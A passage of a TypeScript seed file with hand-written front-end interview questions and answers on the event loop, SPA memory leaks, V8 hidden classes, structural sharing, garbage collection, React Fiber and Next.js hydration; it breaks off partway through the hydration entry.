import type { Question } from "../../../src/lib/schema/question";

export interface CuratedSeed {
  title: string;
  aliases?: string[];
  question: Omit<Question, "createdAt" | "updatedAt" | "sourceFile"> & {
    sourceFile?: string;
  };
}

/**
 * Hand-authored normalized questions seeded from the initial content/ files.
 * Each entry is matched against extracted prompts via fuzzy similarity in
 * `providers/curated.ts`. New raw prompts that don't match any seed fall through
 * to the heuristic provider.
 */
export const CURATED_QUESTIONS: CuratedSeed[] = [
  // ============================================================
  // JAVASCRIPT & BROWSER INTERNALS
  // ============================================================
  {
    title: "How does the event loop prioritize microtasks vs macrotasks?",
    aliases: ["event loop microtasks vs macrotasks"],
    question: {
      id: "event-loop-microtasks-vs-macrotasks",
      slug: "event-loop-microtasks-vs-macrotasks",
      title: "How does the event loop prioritize microtasks vs macrotasks?",
      category: "browser-internals",
      subcategory: "Event Loop",
      tags: ["event-loop", "microtasks", "macrotasks", "promises", "async"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "The event loop drains the entire microtask queue after every macrotask, then renders. Misunderstanding this order causes subtle async bugs.",
      answer: `JavaScript is single-threaded, so all work runs on one call stack. The **event loop** is the runtime mechanism that decides what runs next when the stack is empty. Its cycle is strict and deterministic: pick **one** macrotask, run it to completion, drain the **entire** microtask queue, then check whether to perform a rendering pass (style → layout → paint → composite), then repeat. Understanding this ordering is the difference between code that feels snappy and code with mysterious "off-by-one tick" bugs.

**Macrotasks** (a.k.a. "tasks" in the HTML spec) include \`setTimeout\`, \`setInterval\`, \`setImmediate\` (Node only), I/O callbacks, UI events like \`click\` and \`scroll\`, \`MessageChannel.postMessage\`, and \`fetch\` resolution at the network layer. Each macrotask comes from a *task source*, and the spec gives the browser freedom to pick which source to drain first — which is why mixing \`setTimeout\` and \`postMessage\` can give surprising ordering.

**Microtasks** include \`Promise.then/catch/finally\` callbacks, \`queueMicrotask\`, \`MutationObserver\` callbacks, and in Node, \`process.nextTick\` (which actually has even higher priority than promise microtasks — it runs before the regular microtask queue is drained). Microtasks are designed for "finish this synchronous-ish work before yielding," so they piggy-back on the current task.

The critical rule: **microtasks always run before the next macrotask**, and microtasks queued *during* the drain are appended to and processed in the same drain. This recursion is unbounded — an infinite chain of \`Promise.resolve().then(...)\` will starve the UI because the loop never reaches the rendering step. Contrast with \`setTimeout(fn, 0)\` recursion, which still yields between iterations.

Rendering is folded into the macrotask boundary, but not after every task. The browser opportunistically renders roughly once per display refresh (typically 16.6ms on a 60Hz monitor). \`requestAnimationFrame\` callbacks fire **before** style/layout/paint of that frame, after microtasks have drained — they're the right place to read layout-derived values or schedule pre-paint mutations. \`requestIdleCallback\` runs only if the frame has spare budget.

A few practical consequences: (1) \`await\` is a microtask checkpoint — code after an \`await\` runs in a microtask, not synchronously, even if the awaited promise is already resolved. (2) Batching state updates in React's concurrent mode leverages microtasks to coalesce updates within a tick. (3) \`MutationObserver\` lets you observe DOM changes without forcing a sync layout, because the callback is a microtask, not a synchronous event handler. (4) Long-running JS work blocks both rendering and input, so for big computations use \`scheduler.postTask\` (Chromium), \`isInputPending\`, or chunk work across \`setTimeout(_, 0)\` to give the renderer a chance.

Node's loop has additional phases (timers, pending callbacks, poll, check, close) and runs \`process.nextTick\` + microtasks between **every** phase transition, which is why \`nextTick\` can starve I/O if abused.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Output ordering — predict before running",
          code: `console.log("1");
setTimeout(() => console.log("2"), 0);
Promise.resolve().then(() => {
  console.log("3");
  Promise.resolve().then(() => console.log("4"));
});
queueMicrotask(() => console.log("5"));
console.log("6");

// 1, 6, 3, 5, 4, 2
// All microtasks (3, 5, then the nested 4) drain before setTimeout (2).`,
        },
      ],
      followUps: [
        "What happens if a microtask throws?",
        "How does Node's process.nextTick differ?",
        "Why can a long microtask chain block rendering?",
      ],
      commonMistakes: [
        "Assuming setTimeout(fn, 0) runs before a pending Promise.then.",
        "Believing microtasks yield between each callback — they don't.",
        "Mixing requestAnimationFrame and microtasks expecting them to interleave predictably.",
      ],
      performanceConsiderations: [
        "Long microtask chains can starve rendering and input — measure with the Performance panel.",
        "Use scheduler.postTask (Chromium) or yieldToMain patterns to break up CPU work.",
      ],
      edgeCases: [
        "An unhandled promise rejection inside a microtask schedules `unhandledrejection` as another microtask.",
        "MutationObserver callbacks are microtasks — DOM mutation in a tight loop can blow up the queue.",
      ],
      realWorldExamples: [
        "React batching uses microtasks (in concurrent mode) to coalesce state updates within a single tick.",
      ],
      seniorDiscussion:
        "At staff level, expect to discuss task source ordering across HTML spec sections, the difference between rendering opportunities and animation frames, and how Workers each have their own event loop.",
      relatedSlugs: [
        "explain-memory-leaks-in-spas-and-how-to-debug-them",
        "how-does-garbage-collection-work-internally",
      ],
      companyTags: ["Google", "Meta", "Stripe", "Atlassian"],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 12,
    },
  },
  {
    title: "Explain memory leaks in SPAs and how to debug them",
    aliases: ["memory leaks SPA debug"],
    question: {
      id: "explain-memory-leaks-in-spas-and-how-to-debug-them",
      slug: "explain-memory-leaks-in-spas-and-how-to-debug-them",
      title: "Explain memory leaks in SPAs and how to debug them",
      category: "browser-internals",
      subcategory: "Memory",
      tags: ["memory-leaks", "debugging", "garbage-collection", "devtools", "spa"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "SPAs leak memory when references survive after a route or component unmounts. Detached DOM, event listeners, timers, and closures are the usual suspects.",
      answer: `In a traditional multi-page app the browser tears down the JS heap on every navigation. In a single-page app the heap is **long-lived** — it spans the whole session, and anything still *reachable* from a GC root (globals, the DOM tree, active timers, the current call stack) survives. A memory leak in an SPA is therefore not "memory the engine forgot about" but "memory that some reference is still pointing at, by mistake." The job is to find that reference.

**The four canonical leak shapes:**

1. **Detached DOM**: a node has been removed from the live DOM tree but JS still holds it. Common causes: a \`useRef\` populated then never cleared, a cache like \`{ [id]: domNode }\` that survives re-renders, jQuery-style selectors stored on a module-level object, or an old portal target still referenced by a Popover component. Detached subtrees are particularly bad because each parent retains all descendants — one stale ref pins thousands of nodes.

2. **Lingering subscriptions**: \`addEventListener\` without a matching \`removeEventListener\`, RxJS \`.subscribe()\` without \`.unsubscribe()\`, open WebSocket / EventSource handles, MutationObservers, IntersectionObservers, ResizeObservers, BroadcastChannel listeners. The listener closure captures the component's state and the DOM target it listens to — both become unreclaimable.

3. **Timers**: \`setInterval\` not cleared on unmount keeps firing forever, holding closures and any rendered state captured at mount. Self-rearming \`setTimeout\` chains are worse because they're invisible in DevTools' timer list — you have to trace the call.

4. **Closures over large state**: a callback stored in a \`useCallback\` with no deps captures the very first render's data; a module-level cache (e.g. SWR, your own \`Map\`) accumulates request → response payloads forever; an event emitter retains every subscriber's bound \`this\`.

**Debugging workflow** with Chrome DevTools:

1. Open **Memory → Heap snapshot**, take a baseline.
2. Perform the suspected action 5–10 times — usually "navigate into a route, then leave it" or "open and close a modal." Repeating amplifies the signal above noise.
3. Take a second snapshot. Switch to **Comparison** view against the baseline and sort by *# Delta*.
4. Look for class names like \`Detached HTMLDivElement\`, \`Detached HTMLCanvasElement\`, or component instance names. Expanding a row shows *Retainers*, which is the path of references holding it alive.
5. Walk retainers upward to the GC root. The first thing you don't recognize is usually the leak. Common GC roots: the global \`window\`, a long-lived module variable, a timer, a Promise that never resolved.

For continuous monitoring use **Performance Monitor** (live JS heap line chart) and watch whether the chart's baseline trends upward across forced GCs (the trash-can icon). A healthy SPA sees a sawtooth that returns to a flat baseline; a leaky one sees the baseline climb.

**Prevention patterns:** always return a cleanup function from \`useEffect\` that mirrors every subscription you opened; prefer \`AbortController\` for fetches and listeners (one \`abort()\` cleans many things up); use \`WeakMap\` / \`WeakRef\` for caches keyed by DOM nodes; never store DOM nodes in module-level objects; bound any LRU cache with a max size.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Common React leak pattern + the fix",
          code: `// LEAK — listener never removed
useEffect(() => {
  window.addEventListener("scroll", onScroll);
}, []);

// FIX
useEffect(() => {
  window.addEventListener("scroll", onScroll);
  return () => window.removeEventListener("scroll", onScroll);
}, [onScroll]);

// LEAK — interval keeps the closure (and its captured state) alive
useEffect(() => {
  const id = setInterval(tick, 1000);
  // missing return → leaks across hot reloads & route changes
}, []);

// FIX
useEffect(() => {
  const id = setInterval(tick, 1000);
  return () => clearInterval(id);
}, [tick]);`,
        },
      ],
      followUps: [
        "How do you detect a leak in production without DevTools?",
        "When does a closure stop being a leak — what makes it 'too much retained state'?",
        "What is the impact of React StrictMode double-invocation on leak detection?",
      ],
      commonMistakes: [
        "Treating a one-time growth as a leak — leaks are *unbounded* growth across repeated actions.",
        "Forgetting that React refs survive renders unless explicitly cleared.",
        "Using `useCallback`/`useMemo` deps incorrectly so the closure captures stale, large state.",
      ],
      performanceConsiderations: [
        "Heap growth → more GC pauses → jank.",
        "Detached DOM also retains attached layout/style data, multiplying real cost.",
      ],
      edgeCases: [
        "Service workers and their caches are GC'd separately — `caches.keys()` may grow forever.",
        "DevTools' own retention of console-logged objects can mask real leaks; clear console between snapshots.",
      ],
      realWorldExamples: [
        "Any infinite-scroll list that pushes into an array without windowing — the heap grows linearly forever.",
      ],
      seniorDiscussion:
        "Senior interviews dig into Heap Sampling APIs (`performance.measureUserAgentSpecificMemory()`), how to wire up automated leak regression tests in Playwright, and how the V8 GC's young/old generations affect what you actually observe.",
      relatedSlugs: [
        "how-does-garbage-collection-work-internally",
        "why-does-deleting-object-properties-affect-v8-optimization",
      ],
      companyTags: ["Meta", "Airbnb", "Shopify", "Notion"],
      estimatedReadingMinutes: 9,
      estimatedSolvingMinutes: 15,
    },
  },
  {
    title: "Why does deleting object properties affect V8 optimization?",
    question: {
      id: "why-does-deleting-object-properties-affect-v8-optimization",
      slug: "why-does-deleting-object-properties-affect-v8-optimization",
      title: "Why does deleting object properties affect V8 optimization?",
      category: "browser-internals",
      subcategory: "V8 / Hidden Classes",
      tags: ["v8", "hidden-classes", "optimization", "performance"],
      difficulty: "hard",
      frequency: "medium",
      seniority: "senior",
      shortDescription:
        "V8 builds hidden classes (maps) per object shape. `delete` mutates the shape and forces the object into slow dictionary mode, evicting it from inline-cache fast paths.",
      answer: `JavaScript looks like a "dynamic bag of properties," but modern engines (V8 in Chrome/Node, JavaScriptCore in Safari, SpiderMonkey in Firefox) work hard under the hood to make object access feel like C-struct access. They do this with **hidden classes** (V8 calls them "maps," JSC "structures"). A hidden class is a C++ object describing an object's layout: which property names exist, in what order, and at what byte offset their slots live. Two JS objects created with the same property additions in the same order **share** one hidden class.

This sharing enables **inline caches** (ICs). When the JIT compiles \`obj.x\`, it emits machine code that essentially says: "if \`obj\`'s hidden class pointer === the one I saw last time, read the value at byte offset N directly." That's a single load instruction — near-array-access speed. As long as call sites stay *monomorphic* (one hidden class) the engine inlines and devirtualizes aggressively.

\`delete obj.foo\` breaks the contract that the layout is stable. V8 has two responses depending on heuristics:

1. **Transition to a new hidden class** that lacks \`foo\`. The object's previously cached property offsets may still be valid (V8 can shift the layout, but often it just marks the slot as a hole). However, every previously-monomorphic IC that saw the old hidden class now also has to handle the new one, escalating from monomorphic → polymorphic → megamorphic. Megamorphic call sites fall back to a dictionary lookup.
2. **Demote the entire object to "dictionary mode"** (also called *slow mode*). The object becomes a hash map: lookups become hash → probe → load. This is orders of magnitude slower than the IC fast path, and once demoted, V8 almost never promotes it back.

V8 picks dictionary mode when: many properties have been deleted, properties have non-default attributes (\`writable: false\`, getters/setters), the object grows past a threshold, or you delete a property that isn't the last-added one. So even one badly-placed \`delete\` in a hot path can permanently de-optimize the object — and any function that reads from it.

**Practical guidance**:

- **Set to \`undefined\` (or \`null\`) instead of \`delete\`** in hot objects. The slot remains; the value is just empty. ICs stay monomorphic.
- **Use \`Map\` when keys are truly dynamic**. \`Map\` is designed for arbitrary key insertion and deletion; it does not maintain hidden classes for its keys and won't drag the rest of your code down.
- **Stabilize object shape in constructors**: assign *all* properties up front, in the same order, even if some are \`null\`/\`undefined\`. Avoid conditional \`this.x = …\` blocks that produce different shapes per instance.
- **Avoid mixing types in the same property** across instances — going from \`number\` to \`string\` triggers a transition too.
- **Measure, don't guess**. Use \`node --allow-natives-syntax\` + \`%HaveSameMap(a, b)\` or \`--trace-maps\` to verify two objects share a hidden class. Chrome's V8 tracing flags and the Performance panel's *Bottom-Up* by *Self time* will show \`LoadIC_Megamorphic\` and \`StoreIC_Slow\` symbols when you've broken the fast path.

In application code this rarely matters — JSON-parsed objects, React state, etc. don't sit in tight loops. It matters most for tight numeric kernels, game engines, custom data structures, and library hot paths.`,
      codeSnippets: [
        {
          language: "js",
          caption: "Hidden class friendliness",
          code: `// BAD — different shape per instance, slower property access
function User(name, email) {
  this.name = name;
  if (email) this.email = email;     // sometimes-present prop = shape variation
}

// GOOD — same shape every time
function User(name, email) {
  this.name = name;
  this.email = email ?? null;        // always set, hidden class is stable
}

// BAD — destroys the hidden class
delete user.email;

// GOOD — keeps the shape, marks the slot logically empty
user.email = null;`,
        },
      ],
      followUps: [
        "When IS dictionary mode actually fine?",
        "How do you observe hidden-class transitions?",
        "Does this matter for plain JSON parsing?",
      ],
      commonMistakes: [
        "Optimizing this for cold code — only matters in hot loops.",
        "Assuming `Object.assign` preserves shape — it does, as long as keys are consistent.",
      ],
      performanceConsiderations: [
        "Run V8 with `--allow-natives-syntax` and use `%HasFastProperties(obj)` in benchmarks to verify.",
        "`d8 --trace-maps` shows hidden class transitions in real time.",
      ],
      edgeCases: [
        "Sparse arrays trigger a similar slow path — `delete arr[i]` makes the array holey.",
        "Frozen objects have a stable hidden class but lose monomorphic IC fast-paths after `Object.freeze` in some V8 versions.",
      ],
      realWorldExamples: [
        "ORM-style models that conditionally `delete` fields before serializing tank list rendering performance.",
      ],
      seniorDiscussion:
        "Discuss inline cache megamorphism, the megamorphic stub cache, and how function megamorphism cascades from object shape variation.",
      relatedSlugs: ["how-does-garbage-collection-work-internally"],
      companyTags: ["Google", "Cloudflare", "Vercel"],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 12,
    },
  },
  {
    title: "Difference between shallow copy vs structural sharing",
    question: {
      id: "shallow-copy-vs-structural-sharing",
      slug: "shallow-copy-vs-structural-sharing",
      title: "Difference between shallow copy vs structural sharing",
      category: "javascript",
      tags: ["immutability", "structural-sharing", "immer", "react", "performance"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Shallow copy duplicates the top-level container but reuses inner references. Structural sharing reuses every untouched subtree across versions — the basis of efficient immutable data.",
      answer: `These two ideas are often confused, but they solve very different problems. **Shallow copy** is about *creating a new container*; **structural sharing** is about *creating a new version of a tree while preserving the identity of every untouched branch*. The second one is the foundation of every modern state management library.

**Shallow copy** (\`{...obj}\`, \`Object.assign({}, obj)\`, \`arr.slice()\`, \`Array.from(arr)\`) creates a brand-new top-level container, but every nested object and array inside it is still shared **by reference** with the original. The consequence: mutating a nested field through either reference mutates both. So \`const copy = {...state}; copy.user.name = "X"\` will silently corrupt \`state.user.name\` too. Shallow copy is cheap (O(n) in top-level keys) and is enough for flat objects, but it is *not* a substitute for immutability.

**Deep copy** (\`structuredClone\`, recursive clone, JSON round-trip) goes the other extreme: every nested object is duplicated. That's safe from mutation, but it's O(size of tree), and it throws away reference equality everywhere — so memoization, React's reconciliation, and Redux's \`reselect\` can no longer bail out on untouched subtrees.

**Structural sharing** is the middle ground. When you "modify" an immutable structure, only the path from the root to the changed leaf is cloned — every untouched branch is shared by reference with the previous version. The new tree is a different object, but \`prev.a === next.a\` is \`true\` whenever branch \`a\` wasn't touched. The cost of an update is O(depth) for plain objects, or O(log n) for trie-based persistent structures (HAMT in Immutable.js, Clojure's vectors). The memory cost is also O(depth), not O(size).

This is **why** essentially every React ecosystem library relies on reference equality:

- React's reconciliation skips a re-render when \`Object.is(prevProps, nextProps)\` holds for memoized components.
- \`useMemo\` / \`useCallback\` recompute when their dep array's references change.
- Redux's \`reselect\` only recomputes selectors when input slice references change.
- Zustand and Jotai compare slice references with \`Object.is\` by default.

A shallow copy gives you a cheap top-level identity check — \`state !== prevState\` — but inner refs are *unchanged*, so a top-level shallow copy paired with a nested mutation is exactly the bug that causes "I dispatched the action but the UI didn't update." Structural sharing fixes both halves: every changed level has a new reference, every unchanged level keeps the old one.

**Tools that implement structural sharing** for you:

- **Immer** (used inside Redux Toolkit) — write mutative-looking code on a Proxy draft; Immer produces a new tree that structurally shares unchanged branches.
- **Immutable.js** — HAMT-backed persistent collections (\`Map\`, \`List\`, \`Set\`).
- **Mori**, **Mutative**, **Hamt+** — alternatives with different ergonomics/perf trade-offs.

**Rule of thumb**: use shallow copy for object literals you control end-to-end (cheap, obvious). Use structural sharing (via Immer or manual \`{...obj, x: {...obj.x, y}}\`) anywhere you put state into a store that other code reads, because referential equality there isn't a nicety — it's the contract every consumer is relying on for correctness and performance.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Shallow vs structural — observable difference",
          code: `const state = { user: { name: "Ada" }, posts: [1, 2, 3] };

// Shallow copy
const shallow = { ...state };
shallow.user.name = "Bob";
console.log(state.user.name); // "Bob" — mutation leaked

// Structural sharing (manual)
const next = { ...state, user: { ...state.user, name: "Bob" } };
console.log(state.user.name); // "Ada"
console.log(next.posts === state.posts); // true — untouched branch shared

// Immer does this automatically
import { produce } from "immer";
const next2 = produce(state, (draft) => { draft.user.name = "Bob"; });
console.log(next2.posts === state.posts); // true`,
        },
      ],
      followUps: [
        "How does Immer implement this without you writing the spreads?",
        "Why is `===` enough for React's bail-out?",
        "What's the cost of structural sharing vs naive deep clone?",
      ],
      commonMistakes: [
        "Spreading the root and assuming nested updates are isolated.",
        "Using `JSON.parse(JSON.stringify(x))` for state cloning — kills structural sharing entirely.",
      ],
      performanceConsiderations: [
        "Structural sharing makes shallow equality usable for memoization.",
        "Deep clones break referential equality, forcing re-renders.",
      ],
      edgeCases: [
        "Class instances, Maps, Sets, Dates — generic structural sharing libraries handle these inconsistently.",
        "Circular references break naive cloning; Immer rejects them by design.",
      ],
      realWorldExamples: [
        "React reducer + selector memoization, Apollo Client cache normalization, Redux Toolkit's `createSlice` (uses Immer under the hood).",
      ],
      relatedSlugs: ["how-would-you-prevent-unnecessary-re-renders-in-a-dashboard-with-live-updates"],
      companyTags: ["Meta", "Atlassian", "Linear"],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 10,
    },
  },
  {
    title: "How does garbage collection work internally?",
    question: {
      id: "how-does-garbage-collection-work-internally",
      slug: "how-does-garbage-collection-work-internally",
      title: "How does garbage collection work internally?",
      category: "browser-internals",
      tags: ["garbage-collection", "v8", "memory", "generational-gc"],
      difficulty: "hard",
      frequency: "medium",
      seniority: "senior",
      shortDescription:
        "V8 uses a generational, mostly-concurrent GC: young objects in a fast scavenger, survivors promoted to the old generation collected by mark-sweep-compact.",
      answer: `JavaScript is a garbage-collected language: you allocate freely with \`new\`, \`{}\`, \`[]\`, etc., and the engine is responsible for reclaiming memory that's no longer reachable. The classic algorithm — naïve mark-and-sweep over the whole heap — would freeze the page for hundreds of milliseconds every collection, so modern engines (V8, JSC, SpiderMonkey) combine many techniques to keep pauses sub-millisecond.

**The foundational idea: reachability.** An object is *live* if there is a chain of references from a **GC root** to it. Roots include the current call-stack frames, registers, the global object, the JS module map, and engine-internal handles. Anything not reachable from a root is, by definition, garbage. Reference counting is *not* used directly because it can't reclaim cycles (\`a.next = b; b.next = a\`).

**Generational GC** is the workhorse, motivated by the *weak generational hypothesis*: most objects die young (loop locals, intermediate string concatenations, JSX elements created during render). It pays to collect young objects often and cheaply.

V8's heap layout:

- **Young generation** (~1–16MB, split into "from-space" and "to-space" semi-spaces). Allocation is a **bump-pointer**: just increment a pointer; no free-list lookup. When from-space fills, the **Scavenger** runs Cheney's semi-space copying algorithm: walk roots, copy each reachable object from from-space to to-space, then swap. Anything not copied is dead — there's no per-dead-object work at all. The scavenger is typically <1ms for a few MB.
- **Old generation** (megabytes to gigabytes). Objects that survive ~2 scavenges are *promoted* here. Collected by **Mark-Sweep-Compact** (Major GC):
  - *Mark*: depth-first traversal from roots, set a mark bit on every reachable object.
  - *Sweep*: free runs of unmarked memory back to the free list.
  - *Compact*: occasionally slide live objects together to defragment, which prevents pathological "many small holes" allocation failures later.
- **Large-object space**: objects above a threshold (>~½ page) are allocated separately and never moved.
- **Code-space**, **Map-space**, **Read-only space** — segregated by type.

**Why pauses are tiny on modern engines:**

- **Incremental marking** — the mark phase is sliced into ~5ms steps interleaved with JS, using *write barriers* to track mutations so the marker doesn't miss objects.
- **Concurrent marking** — marking runs on a background thread; the main thread only pauses briefly at start and finish ("STW" remarking).
- **Concurrent sweeping** — likewise.
- **Lazy sweeping** — pages are swept only when an allocation needs that page.
- **Parallel scavenging** — multiple helper threads scavenge in parallel.
- **Idle-time GC** — Chromium tells V8 about idle gaps (e.g. \`requestIdleCallback\` windows, frame slack) and GC runs preferentially in those.
- **Black allocation** during marking — newly allocated objects are pre-marked live, so the marker doesn't have to chase them.

**Observable consequences:**

- The "GC pause" you see in DevTools' Performance panel as a yellow bar is usually a *Minor GC* and is <2ms; *Major GC* is a few tens of ms but rare in healthy code.
- \`global.gc()\` (with \`--expose-gc\`) and Chrome's trash-can icon force a major GC for tests/repro.
- You can't reliably "free" an object — only make it unreachable. Setting variables to \`null\` doesn't free immediately, just makes the object eligible.
- \`WeakRef\` and \`FinalizationRegistry\` (ES2021) let you observe collection, but the spec deliberately doesn't guarantee *when*.
- High-frequency allocation in hot paths still costs: even at <1ms per scavenge, doing it 60×/s eats budget. Object pooling and avoiding closures-in-render are real wins for game loops.`,
      codeSnippets: [
        {
          language: "js",
          caption: "Observing GC indirectly",
          code: `// Chrome DevTools → Performance panel → record → see GC bars.
// performance.measureUserAgentSpecificMemory() (cross-origin-isolated only):
const stats = await performance.measureUserAgentSpecificMemory();
console.log(stats.bytes, stats.breakdown);

// In Node:
//   node --expose-gc script.js
//   global.gc()                    // force collection
//   process.memoryUsage()          // heap stats`,
        },
      ],
      followUps: [
        "What is a write barrier, and why does concurrent GC need one?",
        "How does WeakRef interact with GC?",
        "Why can't JS implement deterministic destructors?",
      ],
      commonMistakes: [
        "Believing `null`-ing a variable forces GC — it only removes the reference.",
        "Assuming GC is the cause of jank without measuring; main-thread JS is more often the culprit.",
      ],
      performanceConsiderations: [
        "Allocate less, reuse more (object pools for hot loops).",
        "Avoid creating objects/closures inside render or animation frames.",
      ],
      edgeCases: [
        "WeakMap/WeakSet keys can be GC'd, but iteration is forbidden (would break reachability).",
        "FinalizationRegistry callbacks fire **without timing guarantees** — never use for resource lifecycle.",
      ],
      realWorldExamples: [
        "React's freelist for fiber nodes is an explicit GC-pressure optimization.",
      ],
      relatedSlugs: [
        "explain-memory-leaks-in-spas-and-how-to-debug-them",
        "why-does-deleting-object-properties-affect-v8-optimization",
      ],
      companyTags: ["Google", "Cloudflare", "Discord"],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 12,
    },
  },

  // ============================================================
  // REACT & RENDERING
  // ============================================================
  {
    title: "Explain React Fiber deeply",
    aliases: ["React Fiber"],
    question: {
      id: "explain-react-fiber-deeply",
      slug: "explain-react-fiber-deeply",
      title: "Explain React Fiber deeply",
      category: "react",
      subcategory: "Internals",
      tags: ["fiber", "reconciliation", "react-internals", "concurrent-rendering"],
      difficulty: "hard",
      frequency: "very-high",
      seniority: "senior",
      shortDescription:
        "Fiber is React's reconciler: a linked-list tree of work units that can be paused, resumed, and prioritized. It's what unlocked concurrent rendering, Suspense, and transitions.",
      answer: `Fiber is the codename for React's reconciler, introduced in React 16. To understand it, start with the problem it solved: pre-Fiber (the "stack reconciler" in React 15), reconciliation was a **recursive, synchronous** depth-first walk of the component tree. Once \`setState\` kicked off a render, React owned the main thread until every component had reconciled and the DOM was patched. A 50ms render meant 50ms of unresponsive input — typing in a search box while a heavy list re-rendered felt broken.

Fiber rewrites reconciliation as a **traversable, interruptible data structure**. Each fiber is a plain JS object representing one node of work — a component, host element, fragment, etc. Crucially, fibers form a linked list, not a recursive call tree:

- \`return\` → parent fiber
- \`child\` → first child
- \`sibling\` → next sibling
- \`alternate\` → the same fiber in the "other" tree (current vs work-in-progress)
- \`pendingProps\`, \`memoizedProps\`, \`memoizedState\`, \`updateQueue\`, \`flags\`/\`effectTag\`, \`lanes\`

Because traversal is driven by pointer-chasing through these fields rather than the C call stack, React can **pause** mid-traversal (save the current fiber pointer), check whether it should yield to the browser via the \`scheduler\` package, and **resume** later from exactly that pointer.

**Two-phase commit:**

1. **Render / reconciliation phase (interruptible, pure).** React builds a *work-in-progress* (WIP) fiber tree by diffing against the current tree. For each fiber it calls the component, derives child elements, reconciles children (\`reconcileChildren\`), and tags any effects (DOM insertions, refs, lifecycle calls) on \`flags\`. No side effects happen here. Between fibers, React can call \`shouldYield()\`; if the browser has higher-priority work (a click, a frame), React saves state and bails out, picking up later. If a higher-priority update comes in, the in-progress WIP is **discarded** and restarted at the higher priority — the render phase is allowed to throw away work because it's pure.
2. **Commit phase (synchronous, non-interruptible).** Once the WIP is fully built, React walks the effect list in one pass: applies DOM mutations, runs \`componentDidMount\`/\`componentDidUpdate\` and \`useLayoutEffect\` synchronously, then schedules \`useEffect\` to run asynchronously after paint. There's no yielding here — atomic, or your DOM is inconsistent.

**Double buffering.** React always keeps two trees: the **current** tree (what the user sees, attached to real DOM nodes) and the **work-in-progress** tree (being built). When commit succeeds, the WIP becomes current. This is why \`alternate\` pointers exist: each fiber in one tree can find its counterpart in the other in O(1), allowing diff-by-reference.

**Lanes and priority.** React 18 generalized "priority" to *lanes* — a 31-bit bitmask. Each update is tagged with one or more lanes (SyncLane, InputContinuousLane, DefaultLane, TransitionLane, IdleLane, etc.). The scheduler picks the highest-priority lane with pending work. A click can pre-empt a transition; transitions don't pre-empt each other. This is what powers \`startTransition\`, \`useDeferredValue\`, automatic batching, and Suspense data loading.

**Suspense via throw-and-catch.** When a component reads data that isn't ready, it *throws a Promise*. React unwinds the WIP tree to the nearest Suspense boundary, marks it as showing fallback, and registers a listener to retry rendering when the promise resolves. The throw mechanism is only legal because the render phase is pure and discardable.

**Why this architecture matters:**

- Interruptible rendering enables time-slicing, concurrent features, and \`startTransition\`.
- Pure render lets React render off-screen (offscreen API), prerender into a hidden tree, and throw away work.
- The alternate-tree design lets refs, memoization, and effects diff against a stable previous version without copying.
- Lanes + heuristic yielding keep INP low even on heavy pages.

This is also why "rules of hooks" exist: hook state lives on the fiber's \`memoizedState\` linked list and is indexed by call order — the entire concurrent model depends on hooks being deterministic per render.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Pre-emption in action",
          code: `// Urgent: typing into the input — must feel instant
setQuery(e.target.value);

// Non-urgent: filtering 10k results — fine if it lags 1 frame
startTransition(() => {
  setResults(expensiveFilter(allItems, e.target.value));
});

// React renders the input update at higher priority,
// can interrupt the in-progress filter render to keep typing smooth.`,
        },
      ],
      followUps: [
        "What's the difference between a fiber and a React element?",
        "How do lanes encode priority?",
        "Why is the render phase pure — what breaks if you mutate during it?",
      ],
      commonMistakes: [
        "Thinking Fiber means async by default — most renders still happen in one go.",
        "Mutating refs/state during render expecting it to commit.",
      ],
      performanceConsiderations: [
        "Work units are small but not free — extremely deep trees still cost.",
        "Bailout via memoization (React.memo, useMemo) skips fiber subtrees entirely.",
      ],
      edgeCases: [
        "Errors thrown in render phase unwind to the nearest error boundary.",
        "Suspense boundaries during SSR have totally different semantics from CSR.",
      ],
      realWorldExamples: [
        "React Server Components and streaming SSR are both built on Fiber's interruptible model.",
      ],
      seniorDiscussion:
        "Discuss the lanes model (31 priority lanes encoded as a bitmask), why Hooks are stored as a linked list on each fiber, and why 'commit phase' is the only place a ref is guaranteed to point to a real DOM node.",
      relatedSlugs: [
        "how-do-concurrent-rendering-and-transitions-work",
        "what-causes-hydration-mismatches-in-next-js",
        "how-would-you-prevent-unnecessary-re-renders-in-a-dashboard-with-live-updates",
      ],
      companyTags: ["Meta", "Vercel", "Linear", "Notion"],
      estimatedReadingMinutes: 10,
      estimatedSolvingMinutes: 15,
    },
  },
  {
    title: "What causes hydration mismatches in Next.js?",
    question: {
      id: "what-causes-hydration-mismatches-in-next-js",
      slug: "what-causes-hydration-mismatches-in-next-js",
      title: "What causes hydration mismatches in Next.js?",
      category: "react",
      subcategory: "SSR / Hydration",
      tags: ["hydration", "ssr", "next-js", "react"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Hydration mismatches happen when server-rendered HTML doesn't match the client's first render. Common causes: time/locale, random IDs, browser-only APIs, third-party DOM mutations.",
      answer: `Hydration is the bridge between the server-rendered HTML the browser receives in the initial document and the React component tree that will run on the client. The server renders HTML and ships it; the client downloads the JS bundle, then React walks the existing DOM and **attaches** state, props, and event listeners *without re-creating the nodes*. The hard constraint is that React expects the *first* client render to produce **byte-for-byte the same virtual tree** the server produced. Any divergence is a "hydration mismatch."

In React 18 / Next 13+, a mismatch triggers a warning in dev, and in production React **bails out** of hydrating the affected boundary, throwing away the server HTML for that subtree and re-rendering it on the client. The result: a visible flicker, a slower TTI, and (worse) lost SEO-relevant DOM if the mismatch is high in the tree. In Next.js App Router with React Server Components, mismatches in a Server Component cascade because all the children also lose their server-rendered output.

**Common causes:**

1. **Non-deterministic values.** \`Date.now()\`, \`Math.random()\`, \`crypto.randomUUID()\`, \`new Date().toLocaleString()\` (locale and timezone differ between server and client), or formatters that use \`Intl\` without an explicit locale.
2. **Environment branching.** \`typeof window !== 'undefined' ? <Foo /> : <Bar />\` produces different trees by design — the SSR pass renders \`<Bar />\`, the client renders \`<Foo />\`. Same for \`navigator.userAgent\` checks.
